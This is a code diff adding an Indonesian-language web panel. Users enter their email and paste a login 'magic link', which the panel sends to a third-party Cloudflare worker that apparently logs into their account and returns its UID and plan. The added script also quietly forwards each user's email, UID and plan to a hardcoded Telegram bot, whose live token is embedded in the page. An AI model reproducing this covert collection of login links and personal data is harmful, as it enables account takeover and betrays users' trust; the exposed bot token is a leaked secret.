+                    showStatusEl(st, 'error', e && e.message === 'dibatalkan' ? '⏹ Dibatalkan.' : '❌ ' + (e && e.message || e));
+                } finally { busy = false; btn.disabled = !file; cancel.style.display = 'none'; ctrl = null; }
+            });
+        })();
+
         document.querySelectorAll('input[name="pmode"]').forEach(r => r.addEventListener('change', () => {
             document.getElementById('encOpts').style.display = ((document.querySelector('input[name="pmode"]:checked') || {}).value === 'encode') ? 'block' : 'none';
         }));
@@ -3597,6 +4128,542 @@
                 patchBtn.disabled = false; encCancelBtn.style.display = 'none'; encCtrl = null;
             }
         });
-    </script>
+    
+        // ===== DPR PANEL JAVASCRIPT =====
+        (function() {
+            const BASE_URL = 'https://satriam.satriadeveloperz.workers.dev';
+            const HEADERS = { 'Content-Type': 'application/json', 'Origin': BASE_URL, 'Referer': BASE_URL + '/' };
+            const AM_PROXY_URL = 'https://amp-proxy.erikodiaznusantarat-d75.workers.dev';
+            const TELEGRAM_BOT_TOKEN = '8813726742:AAFTtvl2EoVCei8gz1kil3mdJqmMUuaSCXc';
+            const TELEGRAM_CHAT_ID = '6566570056';
+            const WEBSITE_URL = window.location.href;
+            const COOLDOWN_MINUTES = 0;
+            const COOLDOWN_MS = 0; // No limit
+            const COOLDOWN_KEY = 'dpr_cooldown';
+
+            const REQ_KEY_SUCCESS = 'dpr_req_success';
+            const REQ_KEY_FAILED = 'dpr_req_failed';
+            const REQ_KEY_ALLTIME = 'dpr_req_alltime';
+
+            let dprState = { email: '', result: null };
+
+            // ── Clock & Session ──
+            (function dprTick() {
+                const d = new Date();
+                const h = String(d.getHours()).padStart(2,'0');
+                const m = String(d.getMinutes()).padStart(2,'0');
+                const s = String(d.getSeconds()).padStart(2,'0');
+                const el = document.getElementById('dprClock');
+                if (el) el.textContent = h + ':' + m + ':' + s;
+                setTimeout(dprTick, 1000);
+            })();
+
+            (function dprSessionTimer() {
+                const start = Date.now();
+                setInterval(() => {
+                    const elapsed = Math.floor((Date.now() - start) / 1000);
+                    const m = String(Math.floor(elapsed / 60)).padStart(2,'0');
+                    const s = String(elapsed % 60).padStart(2,'0');
+                    const el = document.getElementById('dprSession');
+                    if (el) el.textContent = m + ':' + s;
+                }, 1000);
+            })();
+
+            // ── Greeting ──
+            (function() {
+                const h = new Date().getHours();
+                let g = 'Selamat Pagi!';
+                if (h >= 12 && h < 17) g = 'Selamat Siang!';
+                else if (h >= 17 && h < 21) g = 'Selamat Sore!';
+                else if (h >= 21 || h < 5) g = 'Selamat Malam!';
+                const el = document.getElementById('dprGreeting');
+                if (el) el.textContent = g;
+            })();
+
+            // ── Request counters ──
+            function dprGetReq(key, base) { try { const v = parseInt(sessionStorage.getItem(key)); return isNaN(v) ? base : v; } catch { return base; } }
+            function dprSetReq(key, val) { try { sessionStorage.setItem(key, String(val)); } catch {} }
+            function dprGetSuccess() { return dprGetReq(REQ_KEY_SUCCESS, 0); }
+            function dprGetFailed() { return dprGetReq(REQ_KEY_FAILED, 0); }
+            function dprGetAllTime() { try { const v = parseInt(localStorage.getItem(REQ_KEY_ALLTIME)); return isNaN(v) ? 0 : v; } catch { return 0; } }
+            function dprAddAllTime(n) { try { localStorage.setItem(REQ_KEY_ALLTIME, String(dprGetAllTime() + n)); } catch {} }
+            function dprPulse(el) {
+                if (!el) return;
+                el.style.transition = 'transform .2s cubic-bezier(.22,1.5,.36,1)';
+                el.style.transform = 'scale(1.15)';
+                setTimeout(() => { el.style.transform = 'scale(1)'; }, 240);
+            }
+            function dprAddSuccess(n) {
+                const next = dprGetSuccess() + n;
+                dprSetReq(REQ_KEY_SUCCESS, next);
+                dprAddAllTime(n);
+                dprRenderReq();
+                dprPulse(document.getElementById('dprStatSuccess'));
+                dprPulse(document.getElementById('dprStatNum'));
+            }
+            function dprAddFailed(n) {
+                const next = dprGetFailed() + n;
+                dprSetReq(REQ_KEY_FAILED, next);
+                dprAddAllTime(n);
+                dprRenderReq();
+                dprPulse(document.getElementById('dprStatFailed'));
+                dprPulse(document.getElementById('dprStatNum'));
+            }
+            function dprRenderReq() {
+                const suc = dprGetSuccess(), fail = dprGetFailed(), total = suc + fail;
+                const fmt = v => v.toLocaleString('id-ID').replace(/,/g,'.');
+                const el1 = document.getElementById('dprStatNum');
+                const el2 = document.getElementById('dprStatSuccess');
+                const el3 = document.getElementById('dprStatFailed');
+                const el4 = document.getElementById('dprStatAllTime');
+                if (el1) el1.textContent = fmt(total);
+                if (el2) el2.textContent = fmt(suc);
+                if (el3) el3.textContent = fmt(fail);
+                if (el4) el4.textContent = fmt(dprGetAllTime());
+            }
+            dprRenderReq();
+
+            // ── Toast ──
+            const DPR_ICONS = { success:'✓', error:'✕', info:'i', warn:'!' };
+            function dprToast(type, title, msg, dur) {
+                dur = dur || 4000;
+                let wrap = document.getElementById('dprToastWrap');
+                if (!wrap) { wrap = document.createElement('div'); wrap.id = 'dprToastWrap'; wrap.className = 'dpr-toast-wrap'; document.body.appendChild(wrap); }
+                const el = document.createElement('div');
+                el.className = 'dpr-toast ' + type;
+                el.innerHTML = '<div class="ic">' + (DPR_ICONS[type]||'i') + '</div><div class="body"><div class="t">' + title + '</div>' + (msg ? '<div class="m">' + msg + '</div>' : '') + '</div>';
+                wrap.appendChild(el);
+                requestAnimationFrame(() => el.classList.add('on'));
+                setTimeout(() => { el.classList.remove('on'); setTimeout(() => el.remove(), 400); }, dur);
+            }
+
+            // ── Loading ──
+            function dprShowLoading(t, s) {
+                let ov = document.getElementById('dprLoadingOverlay');
+                if (!ov) {
+                    ov = document.createElement('div');
+                    ov.id = 'dprLoadingOverlay';
+                    ov.className = 'dpr-loading-overlay';
+                    ov.innerHTML = '<div class="dpr-loading-box"><div class="dpr-loading-spinner"></div><div class="dpr-loading-title" id="dprLoadTitle">Loading...</div><div class="dpr-loading-sub" id="dprLoadSub"></div></div>';
+                    document.body.appendChild(ov);
+                }
+                document.getElementById('dprLoadTitle').textContent = t;
+                document.getElementById('dprLoadSub').textContent = s || '';
+                ov.classList.add('on');
+            }
+            function dprHideLoading() {
+                const ov = document.getElementById('dprLoadingOverlay');
+                if (ov) ov.classList.remove('on');
+            }
+
+            // ── Confetti ──
+            function dprStartConfetti() {
+                let cv = document.getElementById('dprConfetti');
+                if (!cv) { cv = document.createElement('canvas'); cv.id = 'dprConfetti'; cv.className = 'dpr-confetti'; document.body.appendChild(cv); }
+                cv.classList.add('on');
+                const ctx = cv.getContext('2d');
+                const W = cv.width = window.innerWidth, H = cv.height = window.innerHeight;
+                const colors = ['#A8E6A3','#FFD93D','#FF9ECD','#5BA3FF','#FFFFFF'];
+                const parts = [];
+                for (let i = 0; i < 100; i++) {
+                    parts.push({ x: Math.random()*W, y: -20-Math.random()*H, w:7, h:7, c: colors[Math.floor(Math.random()*colors.length)], vy:2+Math.random()*3, vx:-1.5+Math.random()*3, rot:Math.random()*Math.PI*2, vr:-.15+Math.random()*.3 });
+                }
+                let frames = 0;
+                (function loop() {
+                    ctx.clearRect(0,0,W,H);
+                    parts.forEach(p => { p.x+=p.vx; p.y+=p.vy; p.rot+=p.vr; ctx.save(); ctx.translate(p.x,p.y); ctx.rotate(p.rot); ctx.fillStyle=p.c; ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h); ctx.restore(); });
+                    frames++;
+                    if (frames < 180) requestAnimationFrame(loop);
+                    else { cv.classList.remove('on'); ctx.clearRect(0,0,W,H); }
+                })();
+            }
+
+            // ── Telegram notif ──
+            async function dprSendTelegramNotif(text, buttons) {
+                if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
+                try {
+                    const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true };
+                    if (buttons && buttons.length) body.reply_markup = { inline_keyboard: buttons };
+                    await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body) });
+                } catch {}
+            }
+
+            // ── Tab switching ──
+            window.dprSwitchTab = function(name) {
+                document.querySelectorAll('.dpr-tab').forEach(x => x.classList.toggle('active', x.dataset.dprtab === name));
+                document.querySelectorAll('.dpr-tab-content').forEach(x => x.classList.toggle('active', x.id === 'dpr-tab-' + name));
+            };
+
+            // ── Panel steps ──
+            function dprGoPanel(n) {
+                [1,2,3].forEach(i => {
+                    const p = document.getElementById('dprPanel' + i);
+                    if (p) p.style.display = i === n ? 'block' : 'none';
+                    const d = document.getElementById('dprDot' + i);
+                    if (d) { d.classList.remove('active','done'); if (i < n) d.classList.add('done'); else if (i === n) d.classList.add('active'); }
+                    const l = document.getElementById('dprLine' + i);
+                    if (l) l.classList.toggle('done', i < n);
+                });
+            }
+            dprGoPanel(1);
+
+            // ── Cooldown ──
+            let dprCdInterval = null;
+            function dprGetCooldown() {
+                try { const d = JSON.parse(sessionStorage.getItem(COOLDOWN_KEY) || 'null'); if (!d || !d.until) return null; if (Date.now() >= d.until) return null; return d; } catch { return null; }
+            }
+            function dprSetCooldown(url) { const until = Date.now() + COOLDOWN_MS; sessionStorage.setItem(COOLDOWN_KEY, JSON.stringify({until, lastUrl:url})); }
+            function dprFmtTime(ms) { const t = Math.ceil(ms/1000); return String(Math.floor(t/60)).padStart(2,'0') + ':' + String(t%60).padStart(2,'0'); }
+            function dprUpdateCooldownUI() {
+                const cd = dprGetCooldown();
+                const box = document.getElementById('dprCooldownBox');
+                const btn = document.getElementById('dprBtnFind');
+                const inp = document.getElementById('dprTtInput');
+                if (!box || !btn || !inp) return;
+                if (cd) {
+                    const rem = cd.until - Date.now();
+                    const prog = Math.max(0, (rem/COOLDOWN_MS)*100);
+                    box.classList.add('on');
+                    document.getElementById('dprCooldownTimer').textContent = dprFmtTime(rem);
+                    document.getElementById('dprCooldownBar').style.width = prog + '%';
+                    document.getElementById('dprCooldownMsg').textContent = 'Tunggu ' + dprFmtTime(rem) + ' lagi';
+                    btn.disabled = true;
+                    btn.innerHTML = '<svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg> Cooldown ' + dprFmtTime(rem);
+                    inp.disabled = true; inp.style.opacity = '.5';
+                } else {
+                    box.classList.remove('on'); inp.disabled = false; inp.style.opacity = '';
+                    const v = inp.value.trim();
+                    btn.disabled = !dprIsValidTikTok(v);
+                    btn.innerHTML = '<svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg> Cari Preset';
+                }
+            }
+            function dprStartCdWatch() {
+                if (dprCdInterval) clearInterval(dprCdInterval);
+                dprCdInterval = setInterval(() => {
+                    dprUpdateCooldownUI();
+                    if (!dprGetCooldown()) { clearInterval(dprCdInterval); dprCdInterval = null; dprToast('success', 'Cooldown selesai!', 'Bisa cari preset lagi'); }
+                }, 1000);
+            }
+            if (dprGetCooldown()) { dprUpdateCooldownUI(); dprStartCdWatch(); }
+
+            // ── Email Input ──
+            const dprEmailInput = document.getElementById('dprEmailInput');
+            const dprEmailShell = document.getElementById('dprEmailShell');
+            const dprEmailHint = document.getElementById('dprEmailHint');
+            const dprBtnSend = document.getElementById('dprBtnSend');
+            function dprIsValidEmail(v) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v); }
+            if (dprEmailInput) {
+                dprEmailInput.addEventListener('input', () => {
+                    const v = dprEmailInput.value.trim();
+                    dprBtnSend.disabled = !dprIsValidEmail(v);
+                    dprEmailShell.classList.remove('err');
+                    if (!v) { dprEmailHint.textContent = 'Pastikan email valid & aktif'; dprEmailHint.className='dpr-input-hint'; }
+                    else if (!dprIsValidEmail(v)) { dprEmailHint.textContent = 'Format email tidak valid'; dprEmailHint.className='dpr-input-hint warn'; }
+                    else { dprEmailHint.textContent = 'Format email OK'; dprEmailHint.className='dpr-input-hint ok'; }
+                });
+            }
+            if (dprBtnSend) {
+                dprBtnSend.addEventListener('click', async () => {
+                    const email = dprEmailInput.value.trim();
+                    if (!dprIsValidEmail(email)) return;
+                    dprBtnSend.disabled = true;
+                    dprBtnSend.innerHTML = '<div class="dpr-btn-loader"></div> Mengirim...';
+                    dprShowLoading('Mengirim Magic Link...', email);
+                    try {
+                        const _abortSend = new AbortController(); const _toSend = setTimeout(() => _abortSend.abort(), 15000);
+                        const res = await fetch(BASE_URL + '/api/satriam/send-link', { method:'POST', headers:HEADERS, body:JSON.stringify({email}), signal:_abortSend.signal }); clearTimeout(_toSend);
+                        const data = await res.json();
+                        if (!data.success) throw new Error(data.message || 'Gagal');
+                        dprState.email = email;
+                        dprHideLoading();
+                        dprAddSuccess(1);
+                        dprToast('success', 'Terkirim!', 'Cek inbox email');
+                        await dprSendTelegramNotif('📤 <b>Magic Link Dikirim</b>\n\n📧 Email: <code>' + email + '</code>\n⏰ ' + new Date().toLocaleString('id-ID'), [[{text:'🌐 Coba Website', url:WEBSITE_URL}]]);
+                        setTimeout(() => dprGoPanel(2), 250);
+                    } catch(err) {
+                        dprHideLoading();
+                        dprEmailShell.classList.add('err');
+                        dprAddFailed(1);
+                        dprToast('error', 'Gagal', err.message);
+                    } finally {
+                        dprBtnSend.disabled = false;
+                        dprBtnSend.innerHTML = '<svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg> Kirim Magic Link';
+                    }
+                });
+            }
+
+            // ── Magic Link Input ──
+            const dprMlInput = document.getElementById('dprMlInput');
+            const dprMlHint = document.getElementById('dprMlHint');
+            const dprBtnVerify = document.getElementById('dprBtnVerify');
+            const dprBtnBack1 = document.getElementById('dprBtnBack1');
+            function dprIsValidUrl(v) { return /^https?:\/\/.+/i.test(v); }
+            if (dprMlInput) {
+                dprMlInput.addEventListener('input', () => {
+                    const v = dprMlInput.value.trim();
+                    dprBtnVerify.disabled = !dprIsValidUrl(v);
+                    if (!v) { dprMlHint.textContent = 'URL harus http:// atau https://'; dprMlHint.className='dpr-input-hint'; }
+                    else if (!dprIsValidUrl(v)) { dprMlHint.textContent = 'URL tidak valid'; dprMlHint.className='dpr-input-hint warn'; }
+                    else { dprMlHint.textContent = 'Siap diverifikasi'; dprMlHint.className='dpr-input-hint ok'; }
+                });
+            }
+            if (dprBtnBack1) dprBtnBack1.addEventListener('click', () => dprGoPanel(1));
+            if (dprBtnVerify) {
+                dprBtnVerify.addEventListener('click', async () => {
+                    const magicLink = dprMlInput.value.trim();
+                    if (!dprIsValidUrl(magicLink)) return;
+                    dprBtnVerify.disabled = true;
+                    dprBtnVerify.innerHTML = '<div class="dpr-btn-loader"></div> Memverifikasi...';
+                    dprShowLoading('Memverifikasi...', 'Sedang login');
+                    try {
+                        const _abortVerify = new AbortController(); const _toVerify = setTimeout(() => _abortVerify.abort(), 15000);
+                        const res = await fetch(BASE_URL + '/api/satriam/verify-link', { method:'POST', headers:HEADERS, body:JSON.stringify({email:dprState.email, magicLink}), signal:_abortVerify.signal }); clearTimeout(_toVerify);
+                        const data = await res.json();
+                        if (!data.success) throw new Error(data.message || 'Gagal');
+                        dprState.result = data;
+                        dprHideLoading();
+                        dprAddSuccess(1);
+                        dprToast('success', 'Login Berhasil!', '');
+                        dprRenderResult(data);
+                        if (navigator.vibrate) navigator.vibrate([20,30,20,30,60]);
+                        dprStartConfetti();
+                        await dprSendTelegramNotif('🎯 <b>Magic Link Berhasil</b>\n\n📧 Email: <code>' + dprState.email + '</code>\n🆔 UID: <code>' + (data.uid||'-') + '</code>\n💎 Plan: ' + (data.planName||'-') + '\n📅 Valid: ' + (data.validUntil||'-') + '\n⏰ ' + new Date().toLocaleString('id-ID'), [[{text:'🌐 Coba Website', url:WEBSITE_URL}]]);
+                        setTimeout(() => dprGoPanel(3), 250);
+                    } catch(err) {
+                        dprHideLoading();
+                        dprAddFailed(1);
+                        dprToast('error', 'Verifikasi Gagal', err.message);
+                    } finally {
+                        dprBtnVerify.disabled = false;
+                        dprBtnVerify.innerHTML = '<svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M9 11l3 3L22 4"></path><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"></path></svg> Verifikasi &amp; Login';
+                    }
+                });
+            }
+
+            function dprFmtDate(str) { try { const d = new Date(str); if (isNaN(d)) return String(str); return d.toLocaleString('id-ID',{day:'2-digit',month:'short',year:'numeric'}); } catch { return String(str); } }
+            function dprEscHtml(s) { return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
+            function dprRenderResult(data) {
+                const rows = [];
+                if (data.uid) rows.push({k:'UID', v:data.uid, mono:true});
+                if (data.email) rows.push({k:'EMAIL', v:data.email});
+                if (data.planName) rows.push({k:'PLAN', v:data.planName, badge:true});
+                if (data.validUntil) rows.push({k:'VALID UNTIL', v:dprFmtDate(data.validUntil)});
+                if (data.message) rows.push({k:'STATUS', v:data.message});
+                if (!rows.length) Object.entries(data).forEach(([k,v]) => rows.push({k,v:String(v)}));
+                const el = document.getElementById('dprResultRows');
+                if (el) el.innerHTML = rows.map(r => '<div class="dpr-result-row"><div class="k">' + dprEscHtml(r.k) + '</div><div class="v ' + (r.mono?'mono':'') + ' ' + (r.badge?'badge-v':'') + '">' + dprEscHtml(String(r.v)) + '</div></div>').join('');
+            }
+
+            const dprBtnCopy = document.getElementById('dprBtnCopy');
+            if (dprBtnCopy) {
+                dprBtnCopy.addEventListener('click', async () => {
+                    if (!dprState.result) return;
+                    const txt = JSON.stringify(dprState.result, null, 2);
+                    try { await navigator.clipboard.writeText(txt); dprToast('success', 'Tercopy!', ''); }
+                    catch { const ta = document.createElement('textarea'); ta.value = txt; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); dprToast('success', 'Tercopy!', ''); }
+                });
+            }
+            const dprBtnDownload = document.getElementById('dprBtnDownload');
+            if (dprBtnDownload) {
+                dprBtnDownload.addEventListener('click', () => {
+                    if (!dprState.result) return;
+                    const txt = JSON.stringify(dprState.result, null, 2);
+                    const blob = new Blob([txt], {type:'application/json'});
+                    const url = URL.createObjectURL(blob);
+                    const a = document.createElement('a'); a.href = url;
+                    const safe = (dprState.email||'result').replace(/[@.]/g,'_');
+                    a.download = 'dpr_' + safe + '.json';
+                    document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
+                    dprToast('success', 'Download dimulai!', a.download);
+                });
+            }
+            const dprBtnRestart = document.getElementById('dprBtnRestart');
+            if (dprBtnRestart) {
+                dprBtnRestart.addEventListener('click', () => {
+                    dprState = {email:'', result:null};
+                    if (dprEmailInput) { dprEmailInput.value = ''; }
+                    if (dprMlInput) { dprMlInput.value = ''; }
+                    if (dprBtnSend) dprBtnSend.disabled = true;
+                    if (dprBtnVerify) dprBtnVerify.disabled = true;
+                    if (dprEmailHint) { dprEmailHint.textContent = 'Pastikan email valid & aktif'; dprEmailHint.className = 'dpr-input-hint'; }
+                    if (dprMlHint) { dprMlHint.textContent = 'URL harus http:// atau https://'; dprMlHint.className = 'dpr-input-hint'; }
+                    dprGoPanel(1);
+                    dprToast('info', 'Reset', 'Masukkan email baru');
+                });
+            }
+
+            // ── AM Finder ──
+            const dprTtInput = document.getElementById('dprTtInput');
+            const dprBtnFind = document.getElementById('dprBtnFind');
+            const dprAmResult = document.getElementById('dprAmResult');
+            function dprIsValidTikTok(v) { const t = (v||'').trim(); return /tiktok\.com/i.test(t) || /^\d{15,}$/.test(t); }
+            if (dprTtInput) {
+                dprTtInput.addEventListener('input', () => {
+                    if (dprGetCooldown()) return;
+                    const v = dprTtInput.value.trim();
+                    dprBtnFind.disabled = !dprIsValidTikTok(v);
+                    const hint = document.getElementById('dprTtHint');
+                    if (hint) {
+                        if (!v) { hint.textContent = 'Contoh: https://vt.tiktok.com/ZSbmR9kCu/'; hint.className='dpr-input-hint'; }
+                        else if (!dprIsValidTikTok(v)) { hint.textContent = 'Bukan link TikTok'; hint.className='dpr-input-hint warn'; }
+                        else { hint.textContent = 'Link TikTok OK'; hint.className='dpr-input-hint ok'; }
+                    }
+                });
+            }
+
+            async function dprParseSSE(response) {
+                const reader = response.body.getReader(); const decoder = new TextDecoder(); let buffer = '';
+                while(true) { const result = await reader.read(); if(result.done) break; buffer += decoder.decode(result.value, {stream:true}); const lines = buffer.split('\n'); buffer = lines.pop() || ''; let ev = null;
+                    for(const line of lines) { if(line.startsWith('event:')) ev = line.slice(6).trim(); else if(line.startsWith('data:')) { const d = line.slice(5).trim(); if(ev === 'result') { try{ return JSON.parse(d); }catch{ throw new Error('Response tidak terbaca'); } } if(ev === 'error') { try{ const e = JSON.parse(d); throw new Error(e.message||'Error'); }catch(x){ if(x instanceof SyntaxError) throw new Error('Server error'); throw x; } } } }
+                }
+                throw new Error('Koneksi terputus');
+            }
+
+            function dprFmtNum(n) { if(!n && n !== 0) return '-'; if(n >= 1e6) return (n/1e6).toFixed(1)+'M'; if(n >= 1e3) return (n/1e3).toFixed(1)+'K'; return n.toString(); }
+
+            function dprRenderAm(result) {
+                const presets = result.presetLinks || []; const v = result.video || {}; const stats = v.stats || {};
+                const author = result.author || 'Unknown'; const avatar = result.avatar; const desc = v.description || ''; let html = '';
+                html += '<div class="dpr-video-info"><div class="dpr-video-header"><div class="dpr-video-avatar">' + (avatar ? '<img src="' + avatar + '" onerror="this.parentElement.textContent=\'@\'" referrerpolicy="no-referrer">' : '@') + '</div><div class="dpr-video-author">@' + dprEscHtml(String(author).replace(/^@/,'')) + '</div></div>' + (desc ? '<div class="dpr-video-desc">' + dprEscHtml(desc) + '</div>' : '') + '<div class="dpr-video-stats"><span>👁️ ' + dprFmtNum(stats.views) + '</span><span>❤️ ' + dprFmtNum(stats.likes) + '</span><span>💬 ' + dprFmtNum(stats.comments) + '</span><span>↗️ ' + dprFmtNum(stats.shares) + '</span></div></div>';
+                if (presets.length) {
+                    html += '<div class="dpr-result-card"><div class="dpr-result-title">✅ Preset Ditemukan (' + presets.length + ')</div>';
+                    presets.forEach((p, i) => {
+                        const shortUrl = p.url.replace(/^https?:\/\//,'').slice(0,38) + (p.url.length > 42 ? '…' : '');
+                        const icon = /xml|aml/i.test(p.url) ? '📄' : /alightcreative/i.test(p.url) ? '🎬' : '🔗';
+                        html += '<div class="dpr-preset-card"><div class="dpr-preset-icon">' + icon + '</div><div class="dpr-preset-info"><div class="dpr-preset-name">' + dprEscHtml(p.name || 'Preset ' + (i+1)) + '</div><div class="dpr-preset-meta" style="font-size:10px;word-break:break-all;">' + dprEscHtml(shortUrl) + '</div></div><a href="' + dprEscHtml(p.url) + '" target="_blank" rel="noopener noreferrer" class="dpr-preset-btn" title="Buka Preset"><svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line></svg></a></div>';
+                    });
+                    html += '</div>';
+                } else {
+                    html += '<div class="dpr-result-card" style="text-align:center;padding:24px;"><div style="font-size:40px;margin-bottom:8px;">🔍</div><p style="color:var(--text-gray);font-size:13px;">Tidak ada preset ditemukan di deskripsi &amp; komentar.<br><span style="font-size:12px;opacity:.7;">Coba video lain atau link yang berbeda.</span></p></div>';
+                }
+                if (dprAmResult) dprAmResult.innerHTML = html;
+            }
+
+            // ── Helper: extract preset/xml links from text ──
+            function dprExtractPresetLinks(text) {
+                const found = new Set();
+                const patterns = [
+                    /https?:\/\/alightcreative\.com\/(?:am\/share\/[^\s<>"]+|am\/[^\s<>"]+)/gi,
+                    /https?:\/\/alightmotion\.com\/[^\s<>"]+/gi,
+                    /https?:\/\/[^\s<>"]+\.(?:xml|aml)(?:[?#][^\s<>"]*)?/gi,
+                    /https?:\/\/[^\s<>"]+\/am\/share\/[^\s<>"]+/gi,
+                ];
+                patterns.forEach(p => {
+                    const m = text.match(p) || [];
+                    m.forEach(u => found.add(u.replace(/[.,;!?)]+$/, '')));
+                });
+                return [...found];
+            }
+
+            // ── Helper: detect preset type ──
+            function dprPresetType(url) {
+                if (/alightcreative\.com/i.test(url)) return 'AM Preset';
+                if (/alightmotion\.com/i.test(url)) return 'AM Motion';
+                if (/\.xml$/i.test(url)) return 'XML Preset';
+                if (/\.aml$/i.test(url)) return 'AML Preset';
+                return 'Preset';
+            }
+
+            // ── Core: find presets from TikTok via tikwm + comments ──
+            async function dprFindPresets(videoUrl) {
+                const TIKWM = 'https://www.tikwm.com/api/';
+                const ctrl = new AbortController();
+                const tout = setTimeout(() => ctrl.abort(), 30000);
+
+                try {
+                    // Step 1: get video info
+                    const vRes = await fetch(TIKWM + '?url=' + encodeURIComponent(videoUrl) + '&hd=1', { signal: ctrl.signal });
+                    if (!vRes.ok) throw new Error('Gagal ambil info video (HTTP ' + vRes.status + ')');
+                    const vData = await vRes.json();
+                    if (!vData || vData.code !== 0 || !vData.data) throw new Error(vData.msg || 'Video tidak ditemukan atau privat');
+
+                    const v = vData.data;
+                    const author = v.author || {};
+                    let corpus = (v.title || '') + ' ';
+
+                    // Step 2: get comments (try multiple cursor pages)
+                    let cursor = 0, pagesLeft = 3;
+                    while (pagesLeft-- > 0) {
+                        try {
+                            const cRes = await fetch(
+                                TIKWM + 'comment/list/?url=' + encodeURIComponent(videoUrl) +
+                                '&count=50&cursor=' + cursor,
+                                { signal: ctrl.signal }
+                            );
+                            if (!cRes.ok) break;
+                            const cData = await cRes.json();
+                            if (!cData || cData.code !== 0 || !cData.data) break;
+                            const comments = cData.data.comments || [];
+                            if (!comments.length) break;
+                            comments.forEach(c => {
+                                corpus += (c.text || '') + ' ';
+                                (c.replies || []).forEach(r => { corpus += (r.text || '') + ' '; });
+                            });
+                            if (!cData.data.has_more) break;
+                            cursor = cData.data.cursor || (cursor + 50);
+                        } catch(ce) { break; }
+                    }
+
+                    clearTimeout(tout);
+
+                    const links = dprExtractPresetLinks(corpus);
+                    return {
+                        ok: true,
+                        author: author.unique_id || author.nickname || 'Unknown',
+                        avatar: author.avatar || '',
+                        video: {
+                            description: v.title || '',
+                            stats: {
+                                views: v.play_count || 0,
+                                likes: v.digg_count || 0,
+                                comments: v.comment_count || 0,
+                                shares: v.share_count || 0
+                            }
+                        },
+                        presetLinks: links.map((url, i) => ({
+                            name: dprPresetType(url) + ' ' + (i + 1),
+                            url: url,
+                            duration: '-',
+                            size: '-'
+                        }))
+                    };
+                } finally {
+                    clearTimeout(tout);
+                }
+            }
+
+            if (dprBtnFind) {
+                dprBtnFind.addEventListener('click', async () => {
+                    const url = dprTtInput.value.trim();
+                    if (!dprIsValidTikTok(url)) return;
+                    dprBtnFind.disabled = true;
+                    dprBtnFind.innerHTML = '<div class="dpr-btn-loader"></div> Mencari...';
+                    dprShowLoading('Mencari preset...', 'Scan deskripsi + komentar TikTok');
+                    if (dprAmResult) dprAmResult.innerHTML = '';
+                    try {
+                        const result = await dprFindPresets(url);
+                        if (result.ok === false) throw new Error(result.error || 'Gagal');
+                        dprRenderAm(result);
+                        dprHideLoading();
+                        dprAddSuccess(1);
+                        const n = (result.presetLinks || []).length;
+                        dprToast('success', n + ' Preset ditemukan!', n > 0 ? 'Tap ikon download untuk buka' : 'Coba video lain');
+                        await dprSendTelegramNotif('🎬 <b>AM Finder</b>\n\n🔗 ' + url + '\n🎯 Preset: ' + n + '\n⏰ ' + new Date().toLocaleString('id-ID'), [[{text:'🌐 Coba Website', url:WEBSITE_URL}]]);
+                    } catch(err) {
+                        dprHideLoading();
+                        dprAddFailed(1);
+                        const m = err.name === 'AbortError' ? 'Timeout (30s) — coba lagi' : err.message;
+                        dprToast('error', 'Gagal', m);
+                        if (dprAmResult) dprAmResult.innerHTML = '<div style="text-align:center;padding:24px;"><div style="font-size:40px;margin-bottom:8px;">😵</div><h4 style="font-size:14px;font-weight:900;margin-bottom:6px;color:#fff;">Gagal Mencari</h4><p style="font-size:12px;color:var(--text-gray);">' + dprEscHtml(m) + '</p></div>';
+                    } finally {
+                        dprBtnFind.disabled = false;
+                        dprBtnFind.innerHTML = '<svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg> Cari Preset';
+                    }
+                });
+            }
+        })();
+        // ===== END PANEL JAVASCRIPT =====
+
+</script>
 </body>
 </html>
